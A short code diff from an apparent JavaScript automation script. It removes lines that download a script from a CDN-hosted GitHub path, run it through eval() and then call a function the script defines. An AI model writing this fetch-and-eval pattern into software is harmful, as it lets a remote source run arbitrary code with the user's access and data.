@@ -195,13 +195,6 @@ async function task() {
     result = csdata.key;
   }
   result = "" + waterresult + result;
-  console.log(result);
-  let tasl1data = await axios.get(
-    "https://cdn.jsdelivr.net/gh/Wenmoux/sources@latest/other/activities.js"
-  );
-
-  eval(tasl1data.data);
-  await task1();
   return result;
     } else {
     console.log(logindata);
